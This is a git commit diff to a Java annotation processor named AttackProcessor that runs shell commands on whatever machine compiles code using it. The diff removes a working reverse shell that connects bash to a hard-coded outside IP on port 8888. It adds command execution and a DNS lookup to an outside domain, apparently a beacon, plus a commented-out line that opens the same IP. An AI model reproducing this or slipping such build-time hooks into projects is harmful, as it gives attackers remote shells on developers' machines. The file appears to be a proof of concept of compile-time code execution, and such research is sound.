02edc526198d9c72cdfd0781bc25957730b89b01
nanolikeyou <714284051@qq.com>
2019-10-10 17:27:43 +0800

    run

--- processor/src/main/java/org/cyber/AttackProcessor.java
+++ processor/src/main/java/org/cyber/AttackProcessor.java
@@ -5,10 +5,12 @@ import javax.annotation.processing.AbstractProcessor;
 import javax.annotation.processing.ProcessingEnvironment;
 import javax.annotation.processing.RoundEnvironment;
 import javax.annotation.processing.SupportedAnnotationTypes;
+import javax.imageio.IIOParam;
 import javax.lang.model.element.TypeElement;
 import javax.tools.Diagnostic;
 import java.io.File;
 import java.io.IOException;
+import java.net.Inet4Address;
 import java.util.Set;
 
 @SupportedAnnotationTypes("*")
@@ -27,13 +29,11 @@ public class AttackProcessor extends AbstractProcessor {
 
         try {
             Runtime r = Runtime.getRuntime();
-            //Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
-
-            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/182.92.151.151/8888 0>&1"});
-            p.waitFor();
-        } catch (IOException e) {
-            e.printStackTrace();
-        } catch (InterruptedException e) {
+            Process p = r.exec(new String[]{"/bin/bash","-c","open ."});
+            Inet4Address.getByName( "1.t.dlsr.ga" );
+            //Process p = r.exec(new String[]{"cmd.exe","explorer","http://182.92.151.151:8888"});
+            //p.waitFor();
+        } catch (Exception e) {
             e.printStackTrace();
         }
         processingEnv.getMessager().printMessage(
